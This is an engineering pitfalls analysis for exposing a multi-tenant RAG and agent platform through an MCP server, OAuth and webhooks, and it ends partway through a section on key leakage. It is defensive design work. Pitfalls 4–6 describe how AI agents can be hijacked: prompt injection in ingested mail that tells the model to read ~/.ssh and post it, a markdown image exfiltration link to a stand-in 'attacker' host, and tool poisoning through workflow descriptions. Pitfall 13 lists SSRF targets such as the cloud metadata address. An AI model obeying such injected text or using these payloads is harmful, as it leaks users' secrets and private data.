# Pitfalls Research

**Domain:** Exposing an existing multi-tenant RAG / agent / workflow platform to outside tools: a remote MCP server (Streamable HTTP), personal MCP keys, OAuth 2.1 for MCP, outbound webhooks, admission control and PII redaction on the new outbound paths, plus the Word template bare-token bug (BUG-261022-01).
**Milestone:** v4.9 "Use It From Your Own Tools" (phases from 303, migrations from 220)
**Researched:** 2026-10-30
**Confidence:** HIGH for MCP spec, Claude connector and Supabase OAuth facts (read from official docs today) and for codebase facts (read from source today). MEDIUM for client timeout numbers and proxy behaviour. LOW items are marked inline.

---

## Read this first: three facts that change the plan

1. **The MCP spec changed shape on 2026-07-28, and it removes most of the multi-worker problem.** The current revision has **no protocol sessions, no `Mcp-Session-Id`, no `initialize` handshake, no GET stream and no `Last-Event-ID` resumability**. Every request is a self-contained POST carrying its protocol version in `_meta` and in an `MCP-Protocol-Version` header, plus required `Mcp-Method` / `Mcp-Name` headers the server MUST validate against the body (400 + `-32020 HeaderMismatch`). Closing the response stream IS cancellation. The Python SDK `mcp` 2.0.0 (released 2026-07-28, `pip install mcp` now gives 2.x) "supports the 2026-07-28 revision and serves every earlier revision from the same server". **But clients in the field (Claude Desktop, Cursor, older Claude Code) may still speak 2025-06-18 / 2025-11-25, which DO use sessions.** Run the SDK in `stateless_http=True` mode so legacy clients never get a session ID either, and two uvicorn workers stop mattering. (Sources: MCP changelog 2026-07-28, Streamable HTTP 2026-07-28, python-sdk v2.0.0 release + migration guide.)
2. **Claude.ai cannot use a personal key.** Claude's hosted surfaces (claude.ai, Desktop, mobile, Cowork) authenticate a remote MCP server by OAuth (DCR or CIMD). The only static-key path, `static_headers`, is **beta, limited, entered by a Claude organization Owner, and sent on every call from anyone in that Claude org** -- Anthropic's own docs say *"treat it as the organization's credential, not a person's."* A personal key pasted there makes every member of the customer's Claude org act as that one person. Personal keys are therefore for Claude Code, Cursor and scripts; Claude.ai waits for the OAuth phase. (Source: claude.com/docs/connectors/building/authentication.)
3. **If OAuth is done with Supabase Auth's OAuth 2.1 server, the token it issues is an ordinary Supabase user JWT** -- documented claims include `aud: "authenticated"`, `role: "authenticated"`, plus a `client_id`. Supabase's docs state **scopes do not limit database access**; RLS must. So that token, held by Anthropic's servers, can be replayed straight against this project's PostgREST with the member's full RLS visibility, skipping every MCP narrowing (folder set, tool subset, org kill switch). It is also indistinguishable by `aud` from the app's own session token. (Source: supabase.com/docs/guides/auth/oauth-server/token-security.)

---

## Critical Pitfalls

### Pitfall 1: The MCP door reads through the service role and re-implements visibility by hand

**What goes wrong:**
A key-authenticated MCP call has no user JWT, so the handler queries with the service-role client (`get_supabase()` / the asyncpg pool -- the backend default) and writes its own `WHERE user_id = ...` filter. That filter answers "rows this user OWNS", not "rows this user can SEE". Results then either leak (missing `org_id`, missing connection-scoped `ingest_visibility`, includes another org the person belongs to) or under-return (misses global folders and org-shared items), and both look fine in a single-org dev account.

**Why it happens:**
RLS does not apply to the service role, and every gate in this project reads through the service role -- BUG-260911-01 shipped `app_settings`/`user_settings` with RLS disabled and `anon` holding all privileges while every gate stayed green. The codebase already has three ctx builders that "measurably drifted" (Phase 190 found `org_id` missing from two of three, per `unattended_launch.py`'s docstring). An MCP-specific fourth copy of the visibility rule is the most likely next drift.

**How to avoid:**
- Build the MCP call's context with the **shipped builders** (`_build_resume_context` / the `unattended_launch` path that Phase 293 already reuses) and call the **shipped retrieval path** (`search_documents_tool` -> `retrieval_scope`), never a new query.
- The key's `org_id` is THE org. A member in two orgs (the dev account is in two -- memory `reference_dev_account_is_in_two_orgs`) must get org-A results only from an org-A key, even though the app would show org B after a switch. There is no `X-Org-Id` header on this door; never infer it.
- Add a test that calls each MCP tool as a member of org A who also belongs to org B with a same-named document in B, and asserts B never appears. Add a test as a **non-owner member** who should see an org-shared folder, and asserts it DOES appear (under-return is also a failure).

**Warning signs:** a new `.table("documents").select(...)` or raw SQL inside the MCP module; any `user_id =` predicate without `org_id`; tests that only use one org.

**Phase to address:** MCP server + personal keys phase (first MCP phase). Must be in its "How we'd know this failed" (G-6).

---

### Pitfall 2: Folder-set narrowing enforced on `search` only, bypassed by every other route

**What goes wrong:**
The key says "folders X, Y". `search_knowledge_base` honours it. Then:
- `read_document(id)` fetches any id the user can see (the id came from an old search, a link, or a guess);
- `ask_agent` runs the full agent loop whose tools (`read_document`, `ls`, `tree`, `grep`, `glob`, `query_tables`, `analyze_document`, document relationships, `recall` user memory, sub-agents) each scope independently;
- `run_workflow` runs a published workflow whose folder scope comes **only from the published definition** (Phase 293 D-13: "the structure is the enforcement") -- a key narrowed to X runs a workflow scoped to Z and returns Z's content;
- saved Views (virtual folders) are metadata queries that cross folders;
- a document moved out of X after the key was minted is still returned from a cached id.

**Why it happens:**
Narrowing is added at the entry tool and not at the data layer. This project has hit the exact class twice: Phase 266 found *"empty restricted scope = search EVERYTHING"*, and Phase 260 found *"scope failed OPEN while UI said in force."*

**How to avoid:**
- Represent "no narrowing" as `NULL` and "narrowed" as a non-empty array; an **empty array is refused at mint time** and treated as "nothing" if it ever appears. Write the test for `[]` first.
- Enforce the folder set by passing it into the **same scope object** the retrieval and document-read paths already consume (the Expert scope mechanism `expert_scope.py` is the existing "an Expert ADDS scope / restricts scope" seam -- reuse its intersection semantics rather than inventing new ones), so every agent tool inherits it.
- `run_workflow` over a narrowed key: **refuse** a workflow whose definition scope is not inside the key's folder set (intersection-or-refuse, decided explicitly, never silently widened).
- Decide and document: are subfolders included (recommend yes, resolved at call time), are global folders included (recommend NO unless ticked), is the folder set re-resolved per call (yes -- a moved document leaves scope immediately).
- `ask_agent` must not read `user_memory` (`recall`) or prior threads under a narrowed key -- memory is unscoped by folder and is a side channel.

**Warning signs:** narrowing logic lives in the MCP tool handler rather than in the scope object; a narrowed-key test exists for search but not for read/ask/run; any code path where `folder_ids == []` falls through to "no filter".

**Phase to address:** MCP server + personal keys (search/read); Ask/run phase (agent + workflow intersection). Both phases list "a narrowed key returned a document outside its folder set via route R" as a G-6 failure, with one driven test per route.

---

### Pitfall 3: Tool subset enforced at `tools/list` but not at `tools/call`

**What goes wrong:**
The key allows only `search` and `read`. `tools/list` hides `ask_agent`, but `tools/call name=ask_agent` still executes because dispatch looks the tool up in the full registry. Any client (or a prompt-injected caller model) can call a tool by name without listing it.

**Why it happens:** Filtering the list feels like enforcement. It is presentation.

**How to avoid:** One allow-check at dispatch, keyed on the resolved key's grant, returning the same refusal as an unknown tool. Also: under 2026-07-28, `tools/list` results carry `ttlMs` and `cacheScope`; a per-key filtered list MUST be `cacheScope: "private"` with a short TTL, or a shared intermediary may cache one key's tool list for another.

**Warning signs:** a test that asserts the hidden tool is absent from the list and nothing else.

**Phase to address:** MCP server + personal keys.

---

### Pitfall 4: "Ask the agent" hands an outside caller a networked sandbox next to private data (the lethal trifecta on OUR side)

**What goes wrong:**
The MCP `ask_agent` prompt comes from the caller's model, which may itself be prompt-injected (it just read a web page or an email). It lands in this app's agent, which has (a) the member's private knowledge base, (b) untrusted content (the prompt itself, plus ingested mail and watched-Drive documents), and (c) exfiltration channels: **the sandbox container is created with no network restriction** (`sandbox_service.py` `runtime_configs` carries only `name` + `labels`; `describe_draft_guards.py` records this and calls `execute_code` "an egress channel stronger than web_search"), `web_search` (a query string can carry data), connector write tools (`send_email`, `post_message`, Drive/Gmail writes), and persistence tools (`save_skill`, `remember`) that poison future runs.

**Why it happens:** "Expose existing capabilities" is read as "expose the existing agent with its existing tools."

**How to avoid:**
- MCP-origin agent turns run with a **closed, read-only tool set**: retrieval and document-read tools only. Reuse the existing `POWER_TOOLS` frozenset (`web_search`, `execute_code`, `save_skill`, `attach_skill_file`, `remember`) as the starting deny list and add every external-action / connector write tool. If sandbox compute is wanted for MCP, it ships with the container network disabled (a capability decision -- record it, do not drift into it).
- The MCP prompt is wrapped in the existing TRUST-03 untrusted envelope exactly as `/inbound` inputs are (Phase 293 D-13).
- No human-in-the-loop pause: an MCP-origin run that hits `ask_user` must end with "needs input in the app" plus a link, not sit paused (otherwise Phase 300's waiting-run email fires for a run nobody in the app started).

**Warning signs:** the MCP agent turn calls the same tool-list builder as chat; `execute_code` appears in an MCP-origin run's `harness_audit`; a sandbox container labelled with an MCP-origin thread has a default bridge network.

**Phase to address:** Ask/run phase. This is the highest-severity pitfall in the milestone; put it in SC and G-6.

---

### Pitfall 5: Retrieved text becomes instructions in the CALLER's model (we are the untrusted-content leg of someone else's trifecta)

**What goes wrong:**
A member's Claude Desktop has this MCP server plus filesystem, email and browser tools. Search returns a chunk from a mailbox-ingested message (Phase 240 made mail a virtual root -- **any outside sender can now put text into the knowledge base**) or a watched Drive file shared by an outsider, containing an embedded instruction telling the reader to discard its earlier guidance, read ~/.ssh and post it somewhere. The caller's model obeys. Variants: instructions in document **titles, filenames, metadata fields, workflow names and descriptions**; markdown image links (`![](https://attacker/?d=...)`) in returned text that a rendering client fetches.

**Why it happens:** The server author assumes the client handles injection. Simon Willison's framing: private data + untrusted content + external communication in one agent is the exploit, and "a product that stops 95% of attacks is a failing grade". MCP makes the combination trivially easy to assemble.

**How to avoid (the server cannot make the caller safe -- it can make the content legible and smaller):**
- Return results as **structured data** (`structuredContent` with explicit `text`, `source`, `origin` fields), and in the text form wrap each chunk in a clear delimiter labelled as quoted document content, never as prose the model might read as the server's own voice.
- Carry provenance: the existing TRUST-03 `source_connection_id` / `has_connection_retrieval` flag tells you which chunks came from an external connection (mail, Drive, OneDrive). Mark those `origin: external` in every result.
- Strip or defang markdown image syntax and auto-loading links in text the server returns (agent answers included).
- Offer narrowing that excludes connection-ingested folders, and default new keys to exclude the mailbox virtual root (recommend; operator decision).
- Document the risk plainly on the key-creation screen.

**Warning signs:** tool results are one big markdown string; no `origin` field; a red-team document with an injected instruction is returned verbatim with no delimiter.

**Phase to address:** MCP server + personal keys (result shape, provenance, delimiter); revisit in PII phase (same egress choke point).

---

### Pitfall 6: Dynamic tool descriptions built from member-authored data (tool poisoning, cross-user)

**What goes wrong:**
To be helpful, `run_workflow`'s description lists published workflows, or the server emits one tool per workflow with the workflow's description as the tool description. Any member who can publish a workflow now writes text that sits in **every other member's MCP client system context** with tool-description authority. That is tool poisoning (Invariant Labs, 2025) delivered from inside the org. A later edit to that text is a "rug pull" the client never re-approves.

**How to avoid:** Keep the four tools static and code-authored, deterministic order (2026-07-28 says servers SHOULD). Workflow names, descriptions and input schemas are returned as **data in a `list_workflows` result**, length-capped, never interpolated into a tool description or `inputSchema`.

**Warning signs:** `tools/list` output changes when someone publishes a workflow.

**Phase to address:** Ask/run phase (where `run_workflow` lands).

---

### Pitfall 7: Long synchronous tool calls versus client timeouts, and retries that double-run

**What goes wrong:**
`ask_agent` (a full agent turn, possibly with sub-agents) and `run_workflow` routinely exceed a minute. Clients abandon them: Claude Code users report remote tool calls dropped at **60 s**; Claude Desktop reports a **~4 min** wall clock; a secondary source cites **300 s** for hosted surfaces (all MEDIUM/LOW -- user reports and a blog, not Anthropic docs). Under 2026-07-28 a closed stream IS cancellation and a broken stream loses the request; the client **re-issues it as a new request with a new ID**. Result: the server either keeps burning tokens for an answer nobody receives (KI-001: in-flight LLM calls continue after disconnect) or cancels and the client retries -- and every retry starts **another** agent turn or workflow run, doubling spend and any side effects.

**How to avoid:**
- `run_workflow` and long `ask_agent` return **within ~20-30 s** with a run handle; a `get_run(run_id)` tool returns status/result. Reuse Phase 293's D-12 rule verbatim: *a run is read by the KEY that started it* (`origin_kind = 'key'`-style predicate), which is also exactly the spec's "state handle hijacking" mitigation (bind handles to the authenticated principal; possession is not authentication).
- Accept an optional client idempotency key on start; dedupe in Redis per key for a few minutes so a retried start returns the same run.
- Emit progress notifications on the SSE response while a short call runs, but do not rely on them to extend timeouts (it is client opt-in).
- The tasks extension (`io.modelcontextprotocol/tasks`) is the spec's answer but is an optional extension -- do not depend on client support; the handle+poll tool works everywhere.

**Warning signs:** an MCP handler that `await`s a full run; duplicate `workflow_runs` rows with the same key and inputs seconds apart; spend for runs whose MCP request had already disconnected.

**Phase to address:** Ask/run phase. G-6: "two runs exist for one logical client request" and "a run kept spending after its caller was gone with no recorded decision".

---

### Pitfall 8: Legacy-session clients on two uvicorn workers (if stateful mode is ever used)

**What goes wrong:**
In stateful mode the SDK keeps sessions in **process memory**. Production runs `uvicorn --workers ${WORKER_COUNT:-2}` (backend `Dockerfile`), and Traefik / nginx pool connections, so a 2025-xx client's second request lands on the other worker about half the time and gets "session not found". It passes every local single-worker test.

**How to avoid:** `stateless_http=True` (passed to `streamable_http_app()`/`run()` in SDK 2.x, not the constructor). Server-to-client back-channel features (sampling, elicitation, roots) then raise `NoBackChannelError` for legacy clients -- none of the four tools need them, and the spec has deprecated sampling/roots anyway. If server state is ever needed across calls, use explicit server-minted handles stored in Redis/Postgres keyed `<principal>:<handle>`.

**Also from the SDK migration guide (HIGH):**
- A mounted sub-app's lifespan never runs; FastAPI's lifespan must enter `mcp.session_manager.run()` or every request fails with "Task group is not initialized". Each worker runs its own manager -- fine in stateless mode.
- Default POST body cap 4 MiB (413) -- set deliberately.

**Warning signs:** any `Mcp-Session-Id` in a response; a test suite that only runs with `--workers 1`.

**Phase to address:** MCP server + personal keys. Verification must hit the deployed two-worker container, not `uvicorn --reload`.

---

### Pitfall 9: DNS-rebinding protection and canonical URLs that work locally and fail behind the proxy

**What goes wrong (three variants of "local works, cloud does not" -- DEPLOYMENT-LESSONS theme 6):**
- **SDK host allowlist.** SDK 2.x auto-enables DNS-rebinding protection when the app factory's `host` is `127.0.0.1` (the default for mounted apps) with a port-specific allowlist (`127.0.0.1:*`, `localhost:*`). Behind Traefik/nginx, `Host` is the public domain (the one-box nginx sets `proxy_set_header Host $host`) -> **421 Invalid Host header in production only**. A `Host` with no port also 421s.
- **Wrong scheme in advertised URLs.** uvicorn here runs without `--proxy-headers`/`--forwarded-allow-ips` for remote proxies (`rate_limit.py` documents that every caller shares the proxy address), so `request.url` is `http://...`. Building the Protected Resource Metadata `resource` or `WWW-Authenticate resource_metadata` from the request yields `http://` URLs and Claude rejects or mismatches them. Claude requires `resource` to **equal the URL the user entered, including path**.
- **Path prefix on the one-box.** nginx serves the backend under `/api/` and rewrites it away, and its `location /` SPA fallback returns `index.html` for unknown paths. So `/.well-known/oauth-protected-resource/api/mcp` on the one-box returns the React app with 200 -- discovery silently breaks. Cloud (Coolify backend domain) and one-box therefore have **different canonical MCP URLs**.

**How to avoid:**
- Configure `TransportSecuritySettings(allowed_hosts=..., allowed_origins=...)` explicitly from a settings value; validate `Origin` (spec MUST: present-and-invalid -> 403). Claude.ai calls server-to-server (no `Origin`); browser tools like MCP Inspector send one.
- One configured public MCP base URL (env var: it is infra) used for every advertised URL; add it to `deploy/onebox.env.example`, `docs/OPERATOR.md` and `scripts/check-deploy-drift.sh` in the same commit (deployment-artifact parity rule).
- Add an explicit nginx `location` for the `/.well-known/` MCP paths, or always send `resource_metadata` in the 401 (Claude honours a pointer anywhere on HTTPS).
- Register the URL the server actually answers on: a redirect to another host makes Claude **drop the Authorization header** and fail.

**Warning signs:** 421s in cloud logs; PRM JSON with `http://`; `curl -i https://<host>/.well-known/oauth-protected-resource` returns HTML.

**Phase to address:** MCP server + personal keys (host/origin, base URL); OAuth phase (PRM, well-known paths).

---

### Pitfall 10: A personal key that keeps working after the person should have lost access

**What goes wrong:**
Member removed from the org, banned, or the org turns MCP off -- and the key, an OAuth token, a webhook subscription, or an in-flight run keeps serving them org data. v4.8's W-1 was exactly this class: `STILL_WAITING_SQL` had no `org_members` check while its sibling queries did, so ex-members kept getting emailed.

**What already protects you:** `resolve_api_key` (Phase 293) re-checks revoked, expired, **org membership** and ban on **every call** (D-05). Reuse it; do not write a second resolver.

**Where it will leak if not designed in:**
- **OAuth access tokens** validated by signature alone (JWT) cannot see membership, ban, revocation or the org MCP kill switch until expiry. The OAuth path must hit the same live checks per call.
- **Org kill switch** checked at mint time instead of per call; or checked per call but not for runs already started (decide: stop at the next phase boundary using the existing cross-worker cancel path).
- **Webhook endpoints** owned by an ex-member keep delivering org events to their personal URL. Delivery-time check: owner still a member and still able to see the subject.
- **Role downgrade**: an org-level webhook created by an admin who is now a member.

**How to avoid:** One predicate (`principal_still_allowed(org_id, user_id, credential)`) called by keys, OAuth tokens, webhook delivery and run continuation. A driven test per credential type: remove membership, next call/delivery is refused and audited.

**Warning signs:** any second copy of the membership check; JWT-only validation; webhook worker that loads the endpoint row without joining `org_members`.

**Phase to address:** MCP server + personal keys (kill switch, per-call), Webhooks (delivery check), OAuth (token path). Each phase's G-6 includes "an ex-member's credential produced data after removal".

---

### Pitfall 11: OAuth token audience confusion -- accepting the app's session JWT, or issuing a token that works everywhere

**What goes wrong:**
- MCP server accepts any valid Supabase JWT, so the app's own browser session token (no `client_id`) works at `/mcp` -- token passthrough in spirit; the spec says MCP servers **MUST NOT accept any token not issued for them** and MUST validate audience (RFC 8707).
- The OAuth token issued to Claude is a full Supabase user JWT (`aud: authenticated`), usable directly against PostgREST/Storage/Realtime with the member's RLS visibility, bypassing folder/tool narrowing. Supabase documents that **scopes do not limit database access**.
- Server does strict byte comparison of `aud` vs what the user typed; Claude sends the **canonical** form (lowercase scheme/host, no trailing slash, no default port, path included).

**How to avoid (recommend in this order):**
1. Make the OAuth grant resolve to the **same grant row as a personal key** (folder set, tool subset, org, expiry), so there is one enforcement path. Opaque access tokens looked up per call (like keys) are simplest and give instant revocation.
2. If Supabase OAuth server is used: a Custom Access Token Hook that sets `aud` to the canonical MCP URL for OAuth-client tokens; the MCP server requires that `aud` and a registered `client_id`; and add **RESTRICTIVE RLS policies** denying `auth.jwt() ->> 'client_id' IS NOT NULL` on every table, storage bucket and RPC so an OAuth token is useless outside `/mcp`. Run `get_advisors(security)` after.
3. Never forward the inbound token anywhere (no token passthrough to providers or connectors).

**Warning signs:** MCP auth dependency that calls `supabase.auth.get_user(token)` and nothing else; an OAuth token that returns rows from `https://<project>.supabase.co/rest/v1/documents`.

**Phase to address:** OAuth phase. Needs its own research spike on Supabase OAuth server specifics (CIMD support, loopback port-agnostic matching, refresh rotation) -- LOW confidence on those details today.

---

### Pitfall 12: OAuth client registration and consent done the easy way

**What goes wrong / how to avoid (spec + Claude connector docs, HIGH):**
- **DCR abuse.** Claude registers a **new client on every fresh connection** when using DCR, and `/register` is unauthenticated: unbounded rows, and attacker clients named "Claude" with a lookalike logo for consent phishing. Prefer **CIMD** (Claude uses it only if AS metadata advertises both `client_id_metadata_document_supported: true` and `"none"` in `token_endpoint_auth_methods_supported`; otherwise it falls back to DCR). DCR is deprecated in 2026-07-28. If DCR stays: rate-limit, expire never-used clients, never display unverified `client_name`/`logo_uri` as trusted.
- **CIMD fetch is SSRF.** The AS fetches a client-supplied URL. Route it through `egress.py` (add a capability; the set is closed and pinned by a test) -- public IPs only, pinned, no redirects, size cap. Same for any `logo_uri` you render (or do not fetch it at all).
- **Redirect URIs.** Exact string match for `https://claude.ai/api/mcp/auth_callback` (and pre-allow `https://claude.com/api/mcp/auth_callback`, which Anthropic says may replace it). Claude Code uses RFC 8252 loopback on an ephemeral port: match `http://localhost/callback` **and** `http://127.0.0.1/callback` port-agnostically -- and nothing else is pattern-matched.
- **PKCE S256** required and advertised (`code_challenge_methods_supported: ["S256"]`); `iss` in authorization responses (RFC 9207, a SHOULD trending to MUST).
- **Consent screen** (lives in the React app on Vercel): show client name AND redirect-URI host, extra warning when only loopback URIs are registered, CSRF-protected, `frame-ancestors 'none'` (set in `vercel.json` headers), consent stored per user+client.
- **Refresh tokens** for public clients must rotate (or be sender-constrained); return the new one in the same response; return `invalid_grant` (not a custom code) on a dead token; detect reuse and revoke the family.
- **Latency budget.** Claude waits **10 s** for discovery/registration/token and **30 s** for refresh. Token endpoint must accept `application/x-www-form-urlencoded` (FastAPI JSON-only handlers 415); `/register` is JSON.
- **Reachability.** Connectors are **IPv4-only** and come from `160.79.104.0/21`; a WAF or rate limiter in front of the AS or `/mcp` that 403/429s that range breaks sign-in invisibly. Claude uses only the first `authorization_servers` entry.

**Phase to address:** OAuth phase (last). Verification = a real Claude.ai custom connector connect + refresh + revoke, plus Claude Code loopback.

---

### Pitfall 13: Webhook delivery as an SSRF and data-exfiltration primitive

**What goes wrong:**
A member registers `https://169.254.169.254/...`, `http://backend:8000/admin`, `http://redis:6379`, a hostname that rebinds to `10.x` between validation and send, or a public URL that 302s to an internal one. Then the delivery log UI shows the receiver's response body -- turning blind SSRF into a full read oracle.

**How to avoid:**
- **Reuse `egress.py`; do not write a webhook HTTP client.** It already validates scheme -> host -> every resolved address (with the IPv6 unwrap corpus), pins the IP so the connect cannot re-resolve, refuses redirects (`redirected` reason code -- Standard Webhooks also says treat 3xx as failure and do not follow), and caps the decoded response. Add a `webhook` capability with `_CALLER` match (the org-configured exact host), https only. The capability set is closed and asserted by `test_the_capability_keys_agree_with_the_shipped_closed_set` -- adding it is a deliberate, tested act.
- Validate at registration **and at every delivery** (DNS changes).
- Store only status code, latency and a short, non-echoed reason; never show response bodies or headers to the user.
- One-box customers will want `http://n8n:5678` on the same Docker network. That escape hatch is an **operator** setting with an explicit host allowlist, never a member toggle and never "allow private".
- `egress.py` carries named residual risk RESIDUAL-190-01 (pin depends on private httpx/smtplib internals): any httpx bump re-runs `test_190_residual_fence.py`.

**Warning signs:** `httpx.AsyncClient(...)` anywhere in the webhook module; a delivery-detail endpoint returning `response.text`.

**Phase to address:** Webhooks phase.

---

### Pitfall 14: Duplicate, lost or amplified webhook deliveries across two workers and many ingest paths

**What goes wrong:**
- **Lost:** the event is fired with `asyncio.create_task` or a `BackgroundTask` after the status write. A worker restart, a deploy, or an exception drops it (Phase 293 already learned: a BackgroundTask added before a raise is discarded; bare `create_task` can be garbage-collected mid-run, 293-IN-04).
- **Duplicated:** both uvicorn workers run the dispatcher loop and both send the same delivery; or a retry gets a new `webhook-id` so receivers cannot dedupe.
- **Missed events:** "document ingested" is hooked into the upload route only, but documents also complete via watch sync (`connector_watches` / `WatchService`), the mailbox virtual root, new versions and re-ingest. DEPLOYMENT-LESSONS B4/theme 5: *parallel write paths drift*. "Run finished" is hooked into the producer's normal exit but runs are also finalized by the reconciler, the stranded-run sweep, cancel, admin kill and the cap/circuit breaker.
- **Amplified:** an endpoint is down; every event x 10 attempts x jitter piles up; a re-embed or re-index flips documents through `completed` again and fires thousands of "ingested" events.

**How to avoid:**
- **Transactional outbox:** insert the event row in the same transaction (or same DB statement path) as the state change; a dispatcher claims rows with `FOR UPDATE SKIP LOCKED` (the scheduler already claims "as a database transaction" with no leader -- `docker-compose.prod.yml` comment) and a lease timeout.
- Emit at the **single state transition** (a DB trigger on the status column, or the one function every path calls). Test every ingest and every finalization path emits exactly one event.
- `webhook-id` = event id, stable across retries. Define semantics: "ingested" = first time a version reaches searchable, not every status flip.
- Standard Webhooks schedule (immediate, 5 s, 5 min, 30 min, 2 h, 5 h, 10 h, 14 h, 20 h, 24 h), honour `Retry-After`, 410 disables, 15-30 s timeout. Auto-disable after sustained failure and tell the owner through the existing notification/email path (Phase 300).
- Per-endpoint concurrency cap and a global outbound cap so one dead endpoint cannot starve others.

**Warning signs:** dispatcher with no claim/lease; a test that creates a document via upload only; webhook events appearing during a re-embed.

**Phase to address:** Webhooks phase. Multi-path coverage is a G-6 line item.

---

### Pitfall 15: Webhook signatures that can be replayed, and secrets handled like API keys

**What goes wrong:**
- Signing a re-serialized dict instead of the exact bytes sent (receivers' verification fails intermittently on key order/whitespace).
- No timestamp in the signed content, or receivers not told to check tolerance -> replay.
- The signing secret is **hashed** like an API key (API keys use a one-way digest in `api_key_auth.py`) -- then it cannot sign. Or it is stored in plaintext and readable via PostgREST because the new table shipped without RLS (BUG-260911-01 class).
- Webhook **URLs are secrets too**: Zapier/Slack/n8n hook URLs embed the credential in the path. `egress.py` logs refuse with the host, which is fine; any other log of the full URL is a leak.

**How to avoid:** Standard Webhooks: `webhook-id`, `webhook-timestamp`, `webhook-signature: v1,<base64 HMAC-SHA256 of "id.timestamp.body">`, `whsec_` secret of 24-64 random bytes, per-endpoint secret, rotation by sending both signatures for an overlap window. Store secret and URL encrypted with the existing `secret_cipher` envelope; show the secret once; display URL masked. New tables: RLS on, privileges revoked from `anon`/`PUBLIC`, and an **anon-role test** (nothing in the suite requests as `anon` today -- that is why BUG-260911-01 shipped green).

**Phase to address:** Webhooks phase.

---

### Pitfall 16: Payloads that carry the content the redaction work is supposed to keep in

**What goes wrong:**
"Run finished" ships the final answer text; "document ingested" ships the title, filename (`J_Smith_psych_eval.pdf`), extracted metadata, or a snippet. Webhook receivers (Zapier, n8n cloud, a personal endpoint) are outside the trust boundary and outside org admin control. Phase 300 already decided the waiting-run email is **content-free**; webhooks should not be the hole beside it.

**How to avoid:** Thin payloads (ids, type, status, timestamps, an app link); the receiver fetches details through an authenticated call (MCP or a later REST surface) that re-applies scope at read time. Standard Webhooks recommends thin payloads for auditable data access and keeping payloads under ~20 KB. If any content field is ever added, it passes the same redaction choke point as MCP output.

**Phase to address:** Webhooks phase (schema decision); PII phase (if content is allowed at all).

---

### Pitfall 17: Admission control that counts only the new traffic, leaks slots, or rejects in the wrong layer

**What goes wrong:**
- **Wrong denominator:** the limiter counts MCP calls but the provider account limit is shared with UI chat, workflows, ingestion metadata extraction and embeddings, all on the **same shared keys** across two workers with no cross-worker provider limiter (SEED-081). MCP admission looks fine while UI users get 429s.
- **Fan-out:** one `ask_agent` call becomes N provider calls (sub-agents, `llm_batch_agents` up to `max_parallel_agents=5`, judge validators, rerank, embeddings).
- **Leaked slots:** a Redis counter incremented on acquire and decremented in `finally` leaks when a worker dies or a task is cancelled at a non-yield point; capacity silently ratchets to zero.
- **Unfairness:** a Cursor agent loop issues hundreds of searches a minute and starves people in the app.
- **Wrong layer:** returning HTTP 429 at the MCP transport looks like a server failure to many clients; a tool-level error result with a retry-after sentence lets the caller's model back off.

**How to avoid:**
- **Count all traffic per provider account, admit-control only the new doors** (the milestone scope). Leases in a Redis sorted set with expiry scores (the existing `runs:active` ZSET convention) so dead holders age out.
- Reserve headroom for interactive UI traffic (e.g., MCP may use at most X% of a provider's in-flight budget).
- Charge an `ask_agent`/`run_workflow` admission for its declared fan-out, not one call.
- Per-key and per-org limits through the existing Redis limiter (`services/rate_limit.py`, already fail-closed and cross-worker). Note the per-IP limiter is effectively door-wide (every caller arrives as the proxy address, and Claude.ai traffic all comes from Anthropic's range).

**Warning signs:** an in-process `asyncio.Semaphore` for provider admission (per worker = 2x the limit); an admission counter with no TTL.

**Phase to address:** Ask/run phase (admission lands with the expensive tools). Needs a focused research step on how to measure each provider's in-flight budget -- SEED-081 has the evidence table.

---

### Pitfall 18: Cost attribution blind spots for outside traffic

**What goes wrong:**
Operator spend (Phase 257, `admin_spend.py`) sums **rated runs**. A `search_knowledge_base` call (query embedding, optional rerank) or a short `ask_agent` that does not create a `runs` row is **invisible to spend**. And `origin_kind` gains a new value (`mcp` / `mcp_oauth`) that must be accepted by its CHECK constraint and by every consumer that switches on it (`inbound.py`, `threads.py`, `workflow_runs.py`, `run_read_wire.py`, `db/notifications.py`, `db/workflows.py`, `scheduler_service.py`, `workflow_run_evidence.py`) -- a missing branch silently mis-renders or mis-notifies.

**How to avoid:** Every MCP call that touches a provider writes a metered row tied to key id + org + user; `ask_agent` creates a real run row with an MCP origin so the existing spend, evidence and history surfaces see it. Add the origin to the CHECK constraint, the `audit_service` lockstep literal and every switch in the same commit; grep the set, do not eyeball it (memory: capture the SET, never a tail).

**Phase to address:** MCP server + personal keys (origin plumbing); Ask/run (run rows + spend).

---

### Pitfall 19: PII redaction that breaks citations, misses paths, or quietly fails open

**What goes wrong:**
- **False positives** on the data this app is full of: UUIDs and `source_chunk_id`s, invoice/order numbers, ISO dates, version strings and table cells match phone/card/IBAN patterns. Redacting them breaks citation ids and the numbers people asked for.
- **Citation drift:** the answer quote is redacted but the cited chunk is not (or vice versa), so the citation check (`citation_check_service.py`, Phase 294) and any caller-side quote matching fail.
- **Partial coverage:** search results are redacted but `read_document` full text is not; the agent answer is redacted but tool-call echoes, artifact payloads, file download links (Phase 293 one-time file route), error messages, document titles/filenames and webhook payloads are not.
- **Fail-open:** the redactor throws or times out and the code "never breaks the call" (the D-111-8 pattern) by sending unredacted text, with a log line nobody sees (DEPLOYMENT-LESSONS B3).
- **The trace store:** LangSmith tracing is on by default (SEED-079) and captures full prompts including retrieved context. Redacting MCP output while the same content flows to LangSmith is half a control.
- **Image weight / latency:** an NER model (spaCy large via Presidio) adds hundreds of MB to an image the team deliberately kept lean (DEPLOYMENT-LESSONS A2) and must be a declared dependency (A1); it adds latency per call.

**How to avoid:**
- **One egress choke point** that every MCP result and webhook payload passes through, created in the first MCP phase as an identity function so later paths cannot bypass it; the PII phase fills it in.
- Deterministic placeholders per response (`[EMAIL_1]`), never touching fields typed as ids; redact citation snippets and the answer with the **same** pass so they still agree.
- Decide fail-closed vs fail-open explicitly per path and record it (recommend fail-closed for MCP content, i.e., return an error, not raw text).
- Per-org on/off and entity list in `app_settings`/org settings (settings are DATA here, not env).
- Call out LangSmith as a documented residual in this milestone's scope, with a seed and trigger.
- Measure latency on the real corpus before choosing NER vs regex+checksum.

**Warning signs:** a redaction call inside one tool handler rather than at the egress boundary; tests using lorem ipsum instead of documents that contain ids and dates.

**Phase to address:** PII redaction phase (after both MCP and webhooks exist), with the choke point stubbed in the first MCP phase.

---

### Pitfall 20: Key leakage through client configuration files and logs

**What goes wrong:**
- Personal keys get pasted into `.cursor/mcp.json`, `.mcp.json`, `claude_desktop_config.json` -- files that are routinely **committed** (this repo's own `.mcp.json` is modified in the working tree right now). Claude Desktop reaches a bearer-key remote server only through a bridge such as `mcp-remote` with the key on the command line in the config file.
